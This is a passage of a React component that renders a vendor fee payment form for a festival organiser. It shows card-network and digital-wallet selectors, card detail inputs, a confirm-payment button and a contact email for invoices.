                    className="flex items-center space-x-2 cursor-pointer text-left focus:outline-hidden"
                  >
                    <div className={`w-3.5 h-3.5 rounded-full border flex items-center justify-center shrink-0 ${
                      selectedPaymentMethod === 'discover' ? 'border-[#FF6000]' : 'border-gray-300'
                    }`}>
                      {selectedPaymentMethod === 'discover' && (
                        <div className="w-2 h-2 rounded-full bg-[#FF6000]" />
                      )}
                    </div>
                    <div className={`flex-1 h-11 border rounded-md bg-white flex items-center justify-center p-1 shadow-2xs transition-all ${
                      selectedPaymentMethod === 'discover' ? 'border-[#FF6000] ring-1 ring-[#FF6000]/30 shadow-xs' : 'border-gray-200 hover:border-gray-300'
                    }`}>
                      <span className="font-sans font-bold text-xs text-gray-800 tracking-tight leading-none">
                        DISC<span className="inline-block w-2.5 h-2.5 rounded-full bg-[#FF6000] mx-0.5 align-middle"></span>VER
                      </span>
                    </div>
                  </button>
                </div>

                {/* Optional note for digital wallets */}
                {!isCardPayment && (
                  <div className="p-3.5 rounded-lg bg-blue-50/70 border border-blue-200/80 text-xs text-blue-900 flex items-center space-x-2">
                    <CheckCircle2 className="h-4 w-4 text-blue-600 shrink-0" />
                    <span>
                      {selectedPaymentMethod === 'paypal' && 'You will authorize this payment using your connected PayPal account upon confirmation.'}
                      {selectedPaymentMethod === 'applepay' && 'Apple Pay biometric one-touch authorization will be requested upon clicking Confirm.'}
                      {selectedPaymentMethod === 'googlepay' && 'Google Pay wallet authorization will be verified seamlessly upon clicking Confirm.'}
                    </span>
                  </div>
                )}

                <div className={`space-y-4 pt-2 transition-opacity ${!isCardPayment ? 'opacity-50 pointer-events-none' : ''}`}>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-6">
                    <div>
                      <label className="block text-xs font-normal text-gray-600 mb-1.5">
                        Card number {isCardPayment && '*'}
                      </label>
                      <input
                        type="text"
                        required={isCardPayment}
                        inputMode="numeric"
                        autoComplete="cc-number"
                        value={cardNumber}
                        onChange={handleCardNumberChange}
                        placeholder={!isCardPayment ? 'Authorized via wallet' : ''}
                        disabled={!isCardPayment}
                        className="w-full px-3 py-2 text-sm text-gray-800 bg-white border border-gray-300 rounded-xs focus:outline-hidden focus:border-[#10e5a5] focus:ring-1 focus:ring-[#10e5a5] transition-colors disabled:bg-gray-100"
                      />
                    </div>

                    <div>
                      <label className="block text-xs font-normal text-gray-600 mb-1.5">
                        Cardholder {isCardPayment && '*'}
                      </label>
                      <input
                        type="text"
                        required={isCardPayment}
                        autoComplete="cc-name"
                        value={cardHolder}
                        onChange={(e) => setCardHolder(e.target.value)}
                        placeholder={!isCardPayment ? contactName || 'Authorized via wallet' : ''}
                        disabled={!isCardPayment}
                        className="w-full px-3 py-2 text-sm text-gray-800 bg-white border border-gray-300 rounded-xs focus:outline-hidden focus:border-[#10e5a5] focus:ring-1 focus:ring-[#10e5a5] transition-colors disabled:bg-gray-100"
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-6">
                    <div>
                      <label className="block text-xs font-normal text-gray-600 mb-1.5">
                        Expiry date {isCardPayment && '*'}
                      </label>
                      <div className="grid grid-cols-2 gap-2">
                        <div className="relative">
                          <select
                            value={expiryMonth}
                            disabled={!isCardPayment}
                            onChange={(e) => {
                              setExpiryMonth(e.target.value);
                              setCardExpiry(`${e.target.value}/${expiryYear}`);
                            }}
                            className="w-full appearance-none px-3 py-2 text-xs text-gray-700 bg-white border border-gray-300 rounded-xs focus:outline-hidden focus:border-[#10e5a5] focus:ring-1 focus:ring-[#10e5a5] pr-7 cursor-pointer disabled:bg-gray-100"
                          >
                            <option value="">Month</option>
                            {['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'].map((m) => (
                              <option key={m} value={m}>{m}</option>
                            ))}
                          </select>
                          <ChevronDown className="absolute right-2.5 top-2.5 h-3.5 w-3.5 text-gray-400 pointer-events-none" />
                        </div>

                        <div className="relative">
                          <select
                            value={expiryYear}
                            disabled={!isCardPayment}
                            onChange={(e) => {
                              setExpiryYear(e.target.value);
                              setCardExpiry(`${expiryMonth}/${e.target.value}`);
                            }}
                            className="w-full appearance-none px-3 py-2 text-xs text-gray-700 bg-white border border-gray-300 rounded-xs focus:outline-hidden focus:border-[#10e5a5] focus:ring-1 focus:ring-[#10e5a5] pr-7 cursor-pointer disabled:bg-gray-100"
                          >
                            <option value="">Year</option>
                            {['26', '27', '28', '29', '30', '31', '32', '33'].map((y) => (
                              <option key={y} value={y}>20{y}</option>
                            ))}
                          </select>
                          <ChevronDown className="absolute right-2.5 top-2.5 h-3.5 w-3.5 text-gray-400 pointer-events-none" />
                        </div>
                      </div>
                    </div>

                    <div>
                      <label className="block text-xs font-normal text-gray-600 mb-1.5">
                        CVC {isCardPayment && '*'}
                      </label>
                      <div className="flex items-center space-x-2">
                        <input
                          type="text"
                          required={isCardPayment}
                          inputMode="numeric"
                          autoComplete="cc-csc"
                          value={cardCvc}
                          onChange={handleCvcChange}
                          placeholder={!isCardPayment ? '---' : 'e.g. 123'}
                          maxLength={4}
                          disabled={!isCardPayment}
                          className="w-full px-3 py-2 text-sm text-gray-800 bg-white border border-gray-300 rounded-xs focus:outline-hidden focus:border-[#10e5a5] focus:ring-1 focus:ring-[#10e5a5] transition-colors font-mono disabled:bg-gray-100"
                        />
                        <div 
                          className="shrink-0 p-1 text-gray-400 hover:text-gray-600 cursor-help"
                          title="3 or 4-digit security code on card"
                        >
                          <div className="w-4 h-4 rounded-full border border-gray-400 flex items-center justify-center text-[10px] font-serif font-bold text-gray-500">
                            i
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                <button
                  type="submit"
                  id="submit-vendor-card-payment-btn"
                  disabled={isSubmitting}
                  className="w-full py-4 px-6 rounded-xs bg-[#10e5a5] hover:bg-[#0fd297] text-white font-bold text-sm tracking-wider uppercase transition-colors shadow-xs cursor-pointer text-center disabled:opacity-75 disabled:cursor-not-allowed mt-4"
                >
                  {isSubmitting ? (
                    <span className="inline-flex items-center space-x-2">
                      <div className="h-4 w-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      <span>CONFIRMING PAYMENT...</span>
                    </span>
                  ) : isVendorIdValid ? (
                    <span>CONFIRM PAYMENT — ${feeDueToday}.00 USD</span>
                  ) : (
                    <span>ENTER VENDOR ID TO CONFIRM PAYMENT</span>
                  )}
                </button>
              </div>

              <div className="text-center text-[11px] text-charcoal/60 font-light flex items-center justify-center space-x-2">
                <ShieldCheck className="h-4 w-4 text-forest shrink-0" />
                <span>Zero commission taken. You keep 100% of your festival retail sales.</span>
              </div>
            </form>

            <div className="p-5 rounded-2xl bg-forest/5 border border-gold/25 text-xs flex flex-col sm:flex-row items-center justify-between gap-3">
              <div className="text-charcoal/70 text-center sm:text-left">
                <span className="font-bold text-forest uppercase tracking-wider text-[11px] block">
                  Vendor Coordination Desk
                </span>
                <span>Need an invoice for corporate wire transfer or tax accounting? Contact our team directly.</span>
              </div>
              <a 
                href="mailto:info@valerianevents.com" 
                className="font-mono text-xs font-bold text-forest hover:text-gold shrink-0 px-3 py-1.5 rounded-lg bg-white border border-forest/20 shadow-2xs"
              >
                info@valerianevents.com
              </a>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
